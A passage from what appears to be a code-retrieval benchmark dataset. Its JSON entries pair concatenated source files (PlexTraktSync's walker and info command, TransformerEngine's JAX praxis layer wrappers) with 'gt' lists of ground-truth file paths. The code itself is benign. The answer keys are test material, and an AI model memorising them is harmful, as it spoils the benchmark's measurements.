print(f\"Sync Episodes: {[x.title for x in self.plan.episodes]}\")\n\n    def get_plex_movies(self) -> Generator[PlexLibraryItem, Any, None]:\n\n        if self.plan.movies:\n            movies = self.media_from_items(\"movie\", self.plan.movies)\n        elif self.plan.movie_sections:\n            movies = self.media_from_sections(self.plan.movie_sections)\n        else:\n            return\n\n        yield from movies\n\n    def find_movies(self) -> Generator[Media, Any, None]:\n        for plex in self.get_plex_movies():\n            movie = self.mf.resolve_any(plex)\n            if not movie:\n                continue\n            yield movie\n\n    def get_plex_shows(self) -> Generator[PlexLibraryItem, Any, None]:\n        if self.plan.shows:\n            shows = self.media_from_items(\"show\", self.plan.shows)\n        elif self.plan.show_sections:\n            shows = self.media_from_sections(self.plan.show_sections)\n        else:\n            return\n\n        yield from shows\n\n    def find_episodes(self):\n        if self.plan.episodes:\n            yield from self.get_plex_episodes(self.plan.episodes)\n\n\n        plex_shows: dict[int, PlexLibraryItem] = {}\n        self.logger.info(\"Preload shows data\")\n        for show in self.get_plex_shows():\n            plex_shows[show.key] = show\n        self.logger.info(f\"Preloaded shows data ({len(plex_shows)} shows)\")\n\n\n        show_cache: dict[int, Media] = {}\n        self.logger.info(\"Preload shows matches\")\n        it = self.progressbar(plex_shows.items(), desc=\"Processing show matches\")\n        for show_id, ps in it:\n            show_cache[show_id] = self.mf.resolve_any(ps)\n        self.logger.info(f\"Preloaded shows matches ({len(show_cache)} shows)\")\n\n        for ep in self.episodes_from_sections(self.plan.show_sections):\n            show_id = ep.show_id\n            ep.show = plex_shows[show_id]\n            show = show_cache[show_id] if show_id in show_cache else None\n            m = self.mf.resolve_any(ep, show)\n            if not m:\n                continue\n            if show:\n                m.show = show\n            show_cache[show_id] = m.show\n            yield m\n\n    def walk_shows(self, shows: set[Media], title=\"Processing Shows\"):\n        if not shows:\n            return\n        yield from self.progressbar(shows, desc=title)\n\n    def get_plex_episodes(self, episodes: list[Episode]) -> Generator[Media, Any, None]:\n        it = self.progressbar(episodes, desc=\"Processing episodes\")\n        for pe in it:\n            guid = PlexGuid(pe.grandparentGuid, \"show\")\n            show = self.mf.resolve_guid(guid)\n            if not show:\n                continue\n            me = self.mf.resolve_any(PlexLibraryItem(pe, plex=self.plex), show)\n            if not me:\n                continue\n\n            me.show = show\n            yield me\n\n    def media_from_sections(self, sections: list[PlexLibrarySection]) -> Generator[PlexLibraryItem, Any, None]:\n        for section in sections:\n            with measure_time(f\"{section.title_link} processed\", extra={\"markup\": True}):\n                self.set_window_title(f\"Processing {section.title}\")\n                it = self.progressbar(\n                    section.pager(),\n                    desc=f\"Processing {section.title_link}\",\n                )\n                yield from it\n\n    def episodes_from_sections(self, sections: list[PlexLibrarySection]) -> Generator[PlexLibraryItem, Any, None]:\n        for section in sections:\n            with measure_time(f\"{section.title_link} processed\", extra={\"markup\": True}):\n                self.set_window_title(f\"Processing {section.title}\")\n                it = self.progressbar(\n                    section.pager(\"episode\"),\n                    desc=f\"Processing {section.title_link}\",\n                )\n                yield from it\n\n    def media_from_items(self, libtype: str, items: list) -> Generator[PlexLibraryItem, Any, None]:\n        it = self.progressbar(items, desc=f\"Processing {libtype}s\")\n        for m in it:\n            yield PlexLibraryItem(m, plex=self.plex)\n\n    def episode_from_show(self, show: Media) -> Generator[Media, Any, None]:\n        for pe in show.plex.episodes():\n            me = self.mf.resolve_any(pe, show)\n            if not me:\n                continue\n\n            me.show = show\n            yield me\n\n    def progressbar(self, iterable: Iterable, **kwargs):\n        if self._progressbar:\n            pb = self._progressbar(iterable, **kwargs)\n            with pb as it:\n                yield from it\n        else:\n            yield from iterable\n\n    def media_from_traktlist(self, items: Iterable, title=\"Trakt watchlist\") -> Generator[Media, Any, None]:\n        it = self.progressbar(items, desc=f\"Processing {title}\")\n        for media in it:\n            tm = TraktItem(media)\n            m = self.mf.resolve_trakt(tm)\n            yield m\n\n    def media_from_plexlist(self, items: Iterable) -> Generator[Media, Any, None]:\n        it = self.progressbar(items, desc=\"Processing Plex watchlist\")\n        for media in it:\n            pm = PlexLibraryItem(media, plex=self.plex)\n            m = self.mf.resolve_any(pm)\n            if not m:\n                continue\n            yield m\n\n'PlexTraktSync/plextraktsync/trakt/WatchProgress.py'\n:from __future__ import annotations\n\nfrom typing import TYPE_CHECKING\n\nif TYPE_CHECKING:\n    from trakt.sync import PlaybackEntry\n\n    from plextraktsync.media.Media import Media\n\n\nclass WatchProgress:\n    def __init__(self, progress: list[PlaybackEntry]):\n        self.progress = progress\n\n    def match(self, m: Media):\n        p = [p for p in self.progress if p == m]\n        if not len(p):\n            return None\n        if len(p) != 1:\n            raise RuntimeError(f\"Unexpected match count {len(p)}\")\n        return p[0]\n\n'PlexTraktSync/plextraktsync/commands/info.py'\n:from plextraktsync.factory import factory\nfrom plextraktsync.path import cache_dir, config_dir, log_dir, servers_config\n\n\ndef info(print=factory.print):\n    version = factory.version\n    print(f\"PlexTraktSync Version: {version.full_version}\")\n\n    print(f\"Python Version: {version.py_full_version}\")\n    print(f\"Plex API Version: {version.plex_api_version}\")\n    print(f\"Trakt API Version: {version.trakt_api_version}\")\n    print(f\"Cache Dir: {cache_dir}\")\n    print(f\"Config Dir: {config_dir}\")\n    print(f\"Log Dir: {log_dir}\")\n\n    config = factory.config\n    print(f\"Log File: {config.log_file}\")\n    print(f\"Cache File: {config.cache_path}.sqlite\")\n    print(f\"Config File: {config.config_yml}\")\n    print(f\"Servers Config File: {servers_config}\")\n\n    print(f\"Plex username: {config['PLEX_USERNAME']}\")\n    print(f\"Trakt username: {config['TRAKT_USERNAME']}\")\n\n    print(f\"Plex Server Name: {factory.server_config.name}\")\n\n    if factory.has_plex_token:\n        plex = factory.plex_api\n        print(f\"Plex Server version: {plex.version}, updated at: {plex.updated_at}\")\n\n        sections = plex.library_sections\n        print(f\"Enabled {len(sections.keys())} libraries in Plex Server:\")\n        for id, section in sorted(sections.items()):\n            print(f\" - {id}: {section.title_link}\")\n",
        "gt": [
            "'PlexTraktSync/plextraktsync/trakt/WatchProgress.py'",
            "'PlexTraktSync/plextraktsync/trakt/TraktApi.py'",
            "'PlexTraktSync/plextraktsync/plan/Walker.py'",
            "'PlexTraktSync/plextraktsync/util/Factory.py'",
            "'PlexTraktSync/plextraktsync/factory.py'",
            "'PlexTraktSync/plextraktsync/commands/info.py'"
        ]
    },
    {
        "files": [
            "'TransformerEngine/transformer_engine/jax/praxis/__init__.py'",
            "'TransformerEngine/transformer_engine/jax/praxis/transformer.py'",
            "'TransformerEngine/transformer_engine/jax/praxis/module.py'"
        ],
        "content": "'TransformerEngine/transformer_engine/jax/praxis/__init__.py'\n:\n\n\n\nfrom .module import FusedSoftmax, LayerNorm\nfrom .module import LayerNormLinear, LayerNormMLP, Linear, TransformerEngineBaseLayer\nfrom .transformer import DotProductAttention, MultiHeadAttention\nfrom .transformer import RelativePositionBiases, TransformerLayer\nfrom ..flax.transformer import TransformerLayerType\n\n'TransformerEngine/transformer_engine/jax/praxis/transformer.py'\n:\n\n\n\nfrom functools import partial\nfrom typing import Optional, Sequence, Tuple\nimport warnings\n\nfrom praxis import pax_fiddle\nfrom praxis.base_layer import WeightInit\nfrom praxis.pytypes import JTensor\n\nfrom .module import TransformerEngineBaseLayer\nfrom ..flax.transformer import TransformerLayerType\nfrom ..flax.transformer import DotProductAttention as flax_DotProductAttention\nfrom ..flax.transformer import MultiHeadAttention as flax_MultiHeadAttention\nfrom ..flax.transformer import RelativePositionBiases as flax_RelativePositionBiases\nfrom ..flax.transformer import TransformerLayer as flax_TransformerLayer\nfrom ..fused_attn import AttnBiasType, AttnMaskType\n\n\nclass RelativePositionBiases(TransformerEngineBaseLayer):\n\n\n    num_buckets: int = 32\n    max_distance: int = 128\n    num_attention_heads: int = 64\n    embedding_init: WeightInit = None\n    embedding_axes: Tuple[str, ...] = ()\n\n    @staticmethod\n    def generate_embedding_init(init, num_attention_heads, num_buckets):\n\n        embedding_init = init\n        if embedding_init is None:\n            rb_stddev = (num_attention_heads * num_buckets)**-0.5\n            embedding_init = WeightInit.Gaussian(rb_stddev)\n        return embedding_init\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        embedding_init = RelativePositionBiases.generate_embedding_init(\n            self.embedding_init, self.num_attention_heads, self.num_buckets)\n\n        rpb_cls = partial(flax_RelativePositionBiases,\n                          num_buckets=self.num_buckets,\n                          max_distance=self.max_distance,\n                          num_attention_heads=self.num_attention_heads,\n                          embedding_init=TransformerEngineBaseLayer.generate_params_init(\n                              \"rel_embedding\", embedding_init),\n                          embedding_axes=self.embedding_axes,\n                          dtype=self.dtype)\n\n        self.create_layer(\"relative_position_bias\", rpb_cls)\n\n    def __call__(self, q_seqlen: JTensor, k_seqlen: JTensor, bidirectional: bool = True) -> JTensor:\n\n        return self.relative_position_bias(q_seqlen, k_seqlen, bidirectional)\n\n\nclass DotProductAttention(TransformerEngineBaseLayer):\n\n\n    head_dim: int = 0\n    num_attention_heads: int = 0\n    num_gqa_groups: Optional[int] = None\n    attention_dropout: float = 0.\n    attn_mask_type: AttnMaskType = 'causal'\n    attn_bias_type: AttnBiasType = None\n    dropout_rng_name: str = 'dropout'\n    float32_logits: bool = False\n    qkv_layout: str = 'bshd_bshd_bshd'\n    scale_factor: Optional[float] = None\n    transpose_batch_sequence: bool = True\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        assert self.head_dim > 0, f'{self.head_dim=}'\n        assert self.num_attention_heads > 0, f'{self.num_attention_heads=}'\n\n        dpa_cls = partial(flax_DotProductAttention,\n                          head_dim=self.head_dim,\n                          num_attention_heads=self.num_attention_heads,\n                          num_gqa_groups=self.num_gqa_groups,\n                          attn_mask_type=self.attn_mask_type,\n                          attn_bias_type=self.attn_bias_type,\n                          attention_dropout=self.attention_dropout,\n                          dtype=self.dtype,\n                          dropout_rng_name=self.dropout_rng_name,\n                          float32_logits=self.float32_logits,\n                          qkv_layout=self.qkv_layout,\n                          scale_factor=self.scale_factor,\n                          transpose_batch_sequence=self.transpose_batch_sequence)\n\n        self.create_layer(\"dot_product_attention\", dpa_cls)\n\n    def __call__(self,\n                 query: JTensor,\n                 key: JTensor,\n                 value: JTensor,\n                 mask: Optional[JTensor] = None,\n                 bias: Optional[JTensor] = None,\n                 *,\n                 deterministic: bool = False) -> JTensor:\n\n        return self.dot_product_attention(query,\n                                          key,\n                                          value,\n                                          mask,\n                                          bias,\n                                          deterministic=deterministic)\n\n\nclass MultiHeadAttention(TransformerEngineBaseLayer):\n\n\n    head_dim: int = 0\n    num_attention_heads: int = 0\n    num_gqa_groups: Optional[int] = None\n    attention_dropout: float = 0.\n    dropout_rng_name: str = 'dropout'\n    input_layernorm: bool = True\n    layernorm_type: str = \"layernorm\"\n    layernorm_epsilon: float = 1e-6\n    zero_centered_gamma: bool = False\n    return_layernorm_output: bool = False\n    use_bias: bool = False\n    bias_init: WeightInit = WeightInit.Constant(0.0)\n    attn_mask_type: str = 'causal'\n    attn_bias_type: Optional[str] = None\n    enable_rotary_pos_emb: bool = False\n    rotary_pos_emb_windows: Tuple[int, int] = (1, 10000)\n    rotary_pos_emb_group_method: str = 'consecutive'\n    low_rank_adaptation_scope: str = 'none'\n    low_rank_adaptation_dim: int = 32\n    low_rank_adaptation_alpha: float = None\n    fuse_qkv_params: bool = True\n    transpose_batch_sequence: bool = True\n    enable_sequence_parallel: bool = False\n    scale_attn_logits: bool = False\n    scaled_query_init: bool = True\n    float32_logits: bool = False\n\n\n    num_heads: Optional[int] = None\n    dropout_rate: Optional[float] = None\n    output_layernorm: Optional[bool] = None\n    apply_residual_connection_post_layernorm: Optional[bool] = None\n    fuse_qkv: Optional[bool] = None\n\n    def __post_init__(self):\n\n        if self.num_heads is not None:\n            self.num_attention_heads = self.num_heads\n            warnings.warn(\n                f\"{__class__}.num_heads is deprecated. It will be removed recently. \"\n                f\"Please uses {__class__}.num_attention_heads as the new API.\", DeprecationWarning)\n        if self.dropout_rate is not None:\n            self.attention_dropout = self.dropout_rate\n            warnings.warn(\n                f\"{__class__}.dropout_rate is deprecated. It will be removed recently. \"\n                f\"Please use {__class__}.attention_dropout as the new API.\", DeprecationWarning)\n        if self.apply_residual_connection_post_layernorm is not None:\n            warnings.warn(\n                f\"{__class__}.apply_residual_connection_post_layernorm is deprecated. \"\n                f\"It will be removed recently, please use {__class__}.return_layernorm_output.\",\n                DeprecationWarning)\n        if self.fuse_qkv is not None:\n            warnings.warn(\n                f\"{__class__}.fuse_qkv is deprecated. It will be removed recently. \"\n                f\"Please use {__class__}.fuse_qkv_params as the new API.\", DeprecationWarning)\n        assert self.output_layernorm is None, (\n            f\"{__class__}.output_layernorm is deprecated. It will be removed recently. \"\n            f\"Please use {__class__}.input_layernorm for controlling whether to apply layernorm.\")\n\n        if self.num_gqa_groups is None:\n            self.num_gqa_groups = self.num_heads\n        super().__post_init__()\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        assert self.head_dim > 0, f'{self.head_dim=}'\n        assert self.num_attention_heads > 0, f'{self.num_attention_heads=}'\n\n        mha_cls = partial(\n            flax_MultiHeadAttention,\n            dtype=self.dtype,\n            head_dim=self.head_dim,\n            num_attention_heads=self.num_attention_heads,\n            num_gqa_groups=self.num_gqa_groups,\n            attention_dropout=self.attention_dropout,\n            dropout_rng_name=self.dropout_rng_name,\n            input_layernorm=self.input_layernorm,\n            layernorm_type=self.layernorm_type,\n            layernorm_epsilon=self.layernorm_epsilon,\n            zero_centered_gamma=self.zero_centered_gamma,\n            return_layernorm_output=self.return_layernorm_output,\n            kernel_init=TransformerEngineBaseLayer.generate_params_init(\"kernel\", self.params_init),\n            use_bias=self.use_bias,\n            bias_init=TransformerEngineBaseLayer.generate_params_init(\"bias\", self.bias_init),\n            attn_mask_type=self.attn_mask_type,\n            attn_bias_type=self.attn_bias_type,\n            enable_rotary_pos_emb=self.enable_rotary_pos_emb,\n            rotary_pos_emb_windows=self.rotary_pos_emb_windows,\n            rotary_pos_emb_group_method=self.rotary_pos_emb_group_method,\n            low_rank_adaptation_scope=self.low_rank_adaptation_scope,\n            low_rank_adaptation_dim=self.low_rank_adaptation_dim,\n            low_rank_adaptation_alpha=self.low_rank_adaptation_alpha,\n            fuse_qkv_params=self.fuse_qkv_params,\n            transpose_batch_sequence=self.transpose_batch_sequence,\n            enable_sequence_parallel=self.enable_sequence_parallel,\n            scale_attn_logits=self.scale_attn_logits,\n            scaled_query_init=self.scaled_query_init,\n            float32_logits=self.float32_logits)\n\n        self.create_layer(\"multi_head_attn\", mha_cls)\n\n    def __call__(self,\n                 inputs_q: JTensor,\n                 inputs_kv: JTensor,\n                 mask: Optional[JTensor] = None,\n                 bias: Optional[JTensor] = None,\n                 *,\n                 decode: bool = False,\n                 deterministic: bool = False) -> JTensor:\n\n        return self.multi_head_attn(inputs_q,\n                                    inputs_kv,\n                                    mask,\n                                    bias,\n                                    decode=decode,\n                                    deterministic=deterministic)\n\n\nclass TransformerLayer(TransformerEngineBaseLayer):\n\n\n    hidden_size: int = 512\n    mlp_hidden_size: int = 2048\n    num_attention_heads: int = 8\n    num_gqa_groups: Optional[int] = None\n    layernorm_type: str = 'layernorm'\n    layernorm_epsilon: float = 1e-6\n    zero_centered_gamma: bool = False\n    hidden_dropout: float = 0.1\n    hidden_dropout_dims: Sequence[int] = ()\n    attention_dropout: float = 0.1\n    intermediate_dropout: float = 0.1\n    intermediate_dropout_dims: Sequence[int] = ()\n    dropout_rng_name: str = 'dropout'\n    mlp_activations: Sequence[str] = ('relu',)\n    use_bias: bool = False\n    bias_init: WeightInit = WeightInit.Constant(0.0)\n    apply_residual_connection_post_layernorm: bool = False\n    output_layernorm: bool = False\n    float32_attention_logits: bool = False\n    layer_type: TransformerLayerType = TransformerLayerType.ENCODER\n    self_attn_mask_type: str = 'causal'\n    self_attn_bias_type: Optional[str] = None\n    enable_rotary_pos_emb: bool = False\n    rotary_pos_emb_windows: Tuple[int, int] = (1, 10000)\n    rotary_pos_emb_group_method: str = 'consecutive'\n    low_rank_adaptation_scope: str = 'none'\n    low_rank_adaptation_dim: int = 32\n    low_rank_adaptation_alpha: float = None\n    enable_relative_embedding: bool = True\n    relative_embedding: pax_fiddle.Config[RelativePositionBiases] = pax_fiddle.template_field(None)\n    drop_path: float = 0.0\n    fuse_qkv_params: bool = True\n    transpose_batch_sequence: bool = False\n    enable_sequence_parallel: bool = False\n    scale_attn_logits: bool = False\n    scaled_query_init: bool = True\n\n    def __post_init__(self):\n        if self.num_gqa_groups is None:\n            self.num_gqa_groups = self.num_attention_heads\n        super().__post_init__()\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        relative_embedding_flax_module = None\n        if self.enable_relative_embedding and self.relative_embedding is not None:\n            assert self.relative_embedding.num_attention_heads == \\\n                    self.num_attention_heads, \\\n                \"TransformerLayer.relative_embedding.num_attention_heads shoule be\" \\\n                \"the same as TransformerLayer.num_attention_heads.\"\n\n            embedding_init = RelativePositionBiases.generate_embedding_init(\n                self.relative_embedding.embedding_init, self.relative_embedding.num_attention_heads,\n                self.relative_embedding.num_buckets)\n\n            relative_embedding_flax_module = flax_RelativePositionBiases(\n                num_buckets=self.relative_embedding.num_buckets,\n                max_distance=self.relative_embedding.max_distance,\n                num_attention_heads=self.relative_embedding.num_attention_heads,\n                embedding_init=TransformerEngineBaseLayer.generate_params_init(\n                    \"rel_embedding\", embedding_init),\n                embedding_axes=self.relative_embedding.embedding_axes,\n                dtype=self.relative_embedding.dtype)\n\n        transformerlayer_cls = partial(\n            flax_TransformerLayer,\n            dtype=self.dtype,\n            hidden_size=self.hidden_size,\n            mlp_hidden_size=self.mlp_hidden_size,\n            num_attention_heads=self.num_attention_heads,\n            num_gqa_groups=self.num_gqa_groups,\n            layernorm_type=self.layernorm_type,\n            layernorm_epsilon=self.layernorm_epsilon,\n            zero_centered_gamma=self.zero_centered_gamma,\n            hidden_dropout=self.hidden_dropout,\n            hidden_dropout_dims=self.hidden_dropout_dims,\n            attention_dropout=self.attention_dropout,\n            intermediate_dropout=self.intermediate_dropout,\n            intermediate_dropout_dims=self.intermediate_dropout_dims,\n            dropout_rng_name=self.dropout_rng_name,\n            mha_kernel_init=TransformerEngineBaseLayer.generate_params_init(\n                \"mha_kernel\", self.params_init),\n            mlp_kernel_init=TransformerEngineBaseLayer.generate_params_init(\n                \"mlp_kernel\", self.params_init),\n            mlp_activations=self.mlp_activations,\n            use_bias=self.use_bias,\n            bias_init=TransformerEngineBaseLayer.generate_params_init(\"bias\", self.bias_init),\n            apply_residual_connection_post_layernorm=self.apply_residual_connection_post_layernorm,\n            output_layernorm=self.output_layernorm,\n            float32_attention_logits=self.float32_attention_logits,\n            layer_type=self.layer_type,\n            self_attn_mask_type=self.self_attn_mask_type,\n            self_attn_bias_type=self.self_attn_bias_type,\n            enable_rotary_pos_emb=self.enable_rotary_pos_emb,\n            rotary_pos_emb_windows=self.rotary_pos_emb_windows,\n            rotary_pos_emb_group_method=self.rotary_pos_emb_group_method,\n            low_rank_adaptation_scope=self.low_rank_adaptation_scope,\n            low_rank_adaptation_dim=self.low_rank_adaptation_dim,\n            low_rank_adaptation_alpha=self.low_rank_adaptation_alpha,\n            enable_relative_embedding=self.enable_relative_embedding,\n            relative_embedding=relative_embedding_flax_module,\n            drop_path=self.drop_path,\n            fuse_qkv_params=self.fuse_qkv_params,\n            transpose_batch_sequence=self.transpose_batch_sequence,\n            enable_sequence_parallel=self.enable_sequence_parallel,\n            scale_attn_logits=self.scale_attn_logits,\n            scaled_query_init=self.scaled_query_init)\n\n        self.create_layer(\"transformerlayer\", transformerlayer_cls)\n\n    def __call__(self,\n                 inputs: JTensor,\n                 encoded: JTensor = None,\n                 attention_mask: JTensor = None,\n                 encoder_decoder_mask: JTensor = None,\n                 deterministic: bool = False,\n                 decode: bool = False,\n                 max_decode_length: bool = None) -> JTensor:\n\n        return self.transformerlayer(inputs, encoded, attention_mask, encoder_decoder_mask,\n                                     deterministic, decode, max_decode_length)\n\n'TransformerEngine/transformer_engine/jax/praxis/module.py'\n:\n\n\n\nfrom functools import partial\nfrom typing import Callable, Iterable, Sequence, Tuple, Union\n\nfrom praxis import pax_fiddle\nfrom praxis.base_layer import init_var\nfrom praxis.base_layer import BaseLayer, WeightInit, WeightHParams, WeightHParamsCollection\nfrom praxis.layers import flax_adapter\nfrom praxis.pytypes import JTensor\n\nfrom ..fp8 import FP8Helper\nfrom ..flax.module import DenseGeneral, LayerNormDenseGeneral\nfrom ..flax.module import LayerNorm as flax_LayerNorm\nfrom ..flax.module import LayerNormMLP as flax_LayerNormMLP\nfrom ..flax.module import Softmax\nfrom ..softmax import SoftmaxType\nfrom ..sharding import MajorShardingType, ShardingType\n\n\ndef _generate_ln_scale_init(scale_init):\n    if scale_init is not None:\n        return TransformerEngineBaseLayer.generate_params_init(\"scale\", scale_init)\n    return scale_init\n\n\nclass TransformerEngineBaseLayer(BaseLayer):\n\n\n    logical_axes_rules: Tuple[Tuple, ...] = None\n\n    @staticmethod\n    def generate_params_init(name: str, initializer: WeightInit):\n\n\n        def kernel_init(key, shape, dtype):\n            wp = WeightHParams(shape=shape, init=initializer, dtype=dtype)\n            return init_var(wp, key, name)\n\n        return kernel_init\n\n    def create_layer(self, name, flax_module_cls):\n\n\n        fp8_collection_map = {\n            FP8Helper.FP8_COLLECTION_NAME: [\n                WeightHParamsCollection.SKIP_LP_REGULARIZATION,\n                WeightHParamsCollection.OVERWRITE_WITH_GRADIENT,\n                WeightHParamsCollection.DISALLOW_BFLOAT16_CONVERSION\n            ]\n        }\n\n        flax_module_p = pax_fiddle.Config(flax_adapter.FlaxModuleAdapter,\n                                          module_factory_method=flax_module_cls,\n                                          logical_axes_rules=self.logical_axes_rules,\n                                          var_collection_map=fp8_collection_map,\n                                          ici_mesh_shape=self.ici_mesh_shape,\n                                          dcn_mesh_shape=self.dcn_mesh_shape,\n                                          mesh_axis_names=self.mesh_axis_names)\n\n        self.create_child(name, flax_module_p.clone())\n\n\nclass LayerNorm(TransformerEngineBaseLayer):\n\n\n    epsilon: float = 1e-6\n    layernorm_type: str = 'layernorm'\n    zero_centered_gamma: bool = False\n    scale_init: WeightInit = None\n    scale_axes: Tuple[str, ...] = ()\n    bias_init: WeightInit = WeightInit.Constant(0.0)\n    bias_axes: Tuple[str, ...] = ()\n    transpose_batch_sequence: bool = False\n    sharding_type: ShardingType = ShardingType.SINGLE\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        ln_cls = partial(flax_LayerNorm,\n                         epsilon=self.epsilon,\n                         layernorm_type=self.layernorm_type,\n                         zero_centered_gamma=self.zero_centered_gamma,\n                         scale_init=_generate_ln_scale_init(self.scale_init),\n                         scale_axes=self.scale_axes,\n                         bias_init=TransformerEngineBaseLayer.generate_params_init(\n                             \"ln_bias\", self.bias_init),\n                         bias_axes=self.bias_axes,\n                         dtype=self.dtype,\n                         transpose_batch_sequence=self.transpose_batch_sequence)\n\n        self.create_layer(\"layer_norm\", ln_cls)\n\n    def __call__(self, x: JTensor) -> JTensor:\n\n        return self.layer_norm(x)\n\n\nclass FusedSoftmax(TransformerEngineBaseLayer):\n\n\n    scale_factor: float = 1.0\n    softmax_type: SoftmaxType = SoftmaxType.SCALED\n    sharding_type: ShardingType = ShardingType.SINGLE\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        fused_softmax_cls = partial(Softmax,\n                                    scale_factor=self.scale_factor,\n                                    softmax_type=self.softmax_type)\n\n        self.create_layer(\"fused_softmax\", fused_softmax_cls)\n\n    def __call__(self, x: JTensor, mask: JTensor = None, bias: JTensor = None) -> JTensor:\n\n        return self.fused_softmax(x, mask, bias)\n\n\nclass Linear(TransformerEngineBaseLayer):\n\n\n    out_features: int = 512\n    kernel_axes: Tuple[str, ...] = ()\n    use_bias: bool = True\n    bias_init: WeightInit = WeightInit.Constant(0.0)\n    bias_axes: Tuple[str, ...] = ()\n    enable_low_rank_adaptation: bool = False\n    low_rank_adaptation_dim: int = 32\n    low_rank_adaptation_alpha: float = None\n    axis: Union[Iterable[int], int] = -1\n    transpose_batch_sequence: bool = False\n    sharding_type: ShardingType = ShardingType.SINGLE\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        dense_general_cls = partial(\n            DenseGeneral,\n            features=self.out_features,\n            kernel_init=TransformerEngineBaseLayer.generate_params_init(\"kernel\", self.params_init),\n            kernel_axes=self.kernel_axes,\n            use_bias=self.use_bias,\n            bias_init=TransformerEngineBaseLayer.generate_params_init(\"bias\", self.bias_init),\n            bias_axes=self.bias_axes,\n            enable_low_rank_adaptation=self.enable_low_rank_adaptation,\n            low_rank_adaptation_dim=self.low_rank_adaptation_dim,\n            low_rank_adaptation_alpha=self.low_rank_adaptation_alpha,\n            axis=self.axis,\n            dtype=self.dtype,\n            transpose_batch_sequence=self.transpose_batch_sequence)\n\n        self.create_layer(\"linear\", dense_general_cls)\n\n    def __call__(self, x: JTensor) -> JTensor:\n\n        return self.linear(x)\n\n\nclass LayerNormLinear(TransformerEngineBaseLayer):\n\n\n    out_features: int = 512\n    enable_layernorm: bool = True\n    layernorm_type: str = 'layernorm'\n    epsilon: float = 1e-6\n    zero_centered_gamma: bool = False\n    scale_init: WeightInit = None\n    scale_axes: Tuple[str, ...] = ()\n    ln_bias_init: WeightInit = WeightInit.Constant(1.0)\n    ln_bias_axes: Tuple[str, ...] = ()\n    kernel_axes: Tuple[str, ...] = ()\n    use_bias: bool = False\n    bias_init: WeightInit = WeightInit.Constant(0.0)\n    bias_axes: Tuple[str, ...] = ()\n    enable_low_rank_adaptation: bool = False\n    low_rank_adaptation_dim: int = 32\n    low_rank_adaptation_alpha: float = None\n    return_layernorm_output: bool = True\n    axis: Union[Iterable[int], int] = -1\n    transpose_batch_sequence: bool = False\n    depth_scaling: float = None\n    sharding_type: ShardingType = ShardingType.SINGLE\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        ln_dense_general_cls = partial(\n            LayerNormDenseGeneral,\n            features=self.out_features,\n            enable_layernorm=self.enable_layernorm,\n            layernorm_type=self.layernorm_type,\n            epsilon=self.epsilon,\n            zero_centered_gamma=self.zero_centered_gamma,\n            scale_init=_generate_ln_scale_init(self.scale_init),\n            scale_axes=self.scale_axes,\n            ln_bias_init=TransformerEngineBaseLayer.generate_params_init(\n                \"ln_bias\", self.ln_bias_init),\n            ln_bias_axes=self.ln_bias_axes,\n            kernel_init=TransformerEngineBaseLayer.generate_params_init(\"kernel\", self.params_init),\n            kernel_axes=self.kernel_axes,\n            use_bias=self.use_bias,\n            bias_init=TransformerEngineBaseLayer.generate_params_init(\"bias\", self.bias_init),\n            bias_axes=self.bias_axes,\n            enable_low_rank_adaptation=self.enable_low_rank_adaptation,\n            low_rank_adaptation_dim=self.low_rank_adaptation_dim,\n            low_rank_adaptation_alpha=self.low_rank_adaptation_alpha,\n            return_layernorm_output=self.return_layernorm_output,\n            axis=self.axis,\n            dtype=self.dtype,\n            transpose_batch_sequence=self.transpose_batch_sequence,\n            depth_scaling=self.depth_scaling)\n\n        self.create_layer(\"ln_linear\", ln_dense_general_cls)\n\n    def __call__(self, x: JTensor) -> JTensor:\n\n        return self.ln_linear(x)\n\n\nclass LayerNormMLP(TransformerEngineBaseLayer):\n\n\n    intermediate_dim: int = 2048\n    enable_layernorm: bool = True\n    layernorm_type: str = 'layernorm'\n    epsilon: float = 1e-6\n    zero_centered_gamma: bool = False\n    scale_init: WeightInit = None\n    scale_axes: Tuple[str, ...] = ()\n    ln_bias_init: WeightInit = WeightInit.Constant(1.0)\n    ln_bias_axes: Tuple[str, ...] = ()\n    kernel_axes_1: Tuple[str, ...] = ()\n    kernel_axes_2: Tuple[str, ...] = ()\n    use_bias: bool = False\n    bias_init: WeightInit = WeightInit.Constant(0.0)\n    bias_axes_1: Tuple[str, ...] = ()\n    bias_axes_2: Tuple[str, ...] = ()\n    enable_low_rank_adaptation: bool = False\n    low_rank_adaptation_dim: int = 32\n    low_rank_adaptation_alpha: float = None\n    return_layernorm_output: bool = True\n    activations: Sequence[Union[str, Callable]] = ('relu',)\n    intermediate_dropout_rate: float = 0.1\n    intermediate_hidden_dropout_dims: Sequence[int] = ()\n    axis: Union[Iterable[int], int] = -1\n    transpose_batch_sequence: bool = False\n    major_sharding_type: MajorShardingType = MajorShardingType.SINGLE\n\n    def setup(self) -> None:\n\n        super().setup()\n\n        ln_mlp_cls = partial(\n            flax_LayerNormMLP,\n            intermediate_dim=self.intermediate_dim,\n            enable_layernorm=self.enable_layernorm,\n            layernorm_type=self.layernorm_type,\n            epsilon=self.epsilon,\n            zero_centered_gamma=self.zero_centered_gamma,\n            scale_init=_generate_ln_scale_init(self.scale_init),\n            scale_axes=self.scale_axes,\n            ln_bias_init=TransformerEngineBaseLayer.generate_params_init(\n                \"ln_bias\", self.ln_bias_init),\n            ln_bias_axes=self.ln_bias_axes,\n            kernel_init=TransformerEngineBaseLayer.generate_params_init(\"kernel\", self.params_init),\n            kernel_axes_1=self.kernel_axes_1,\n            kernel_axes_2=self.kernel_axes_2,\n            use_bias=self.use_bias,\n            bias_init=TransformerEngineBaseLayer.generate_params_init(\"bias\", self.bias_init),\n            bias_axes_1=self.bias_axes_1,\n            bias_axes_2=self.bias_axes_2,\n            enable_low_rank_adaptation=self.enable_low_rank_adaptation,\n            low_rank_adaptation_dim=self.low_rank_adaptation_dim,\n            low_rank_adaptation_alpha=self.low_rank_adaptation_alpha,\n            return_layernorm_output=self.return_layernorm_output,\n            activations=self.activations,\n            intermediate_dropout_rate=self.intermediate_dropout_rate,\n            intermediate_hidden_dropout_dims=self.intermediate_hidden_dropout_dims,\n            axis=self.axis,\n            dtype=self.dtype,\n            transpose_batch_sequence=self.transpose_batch_sequence)\n\n        self.create_layer(\"ln_mlp\", 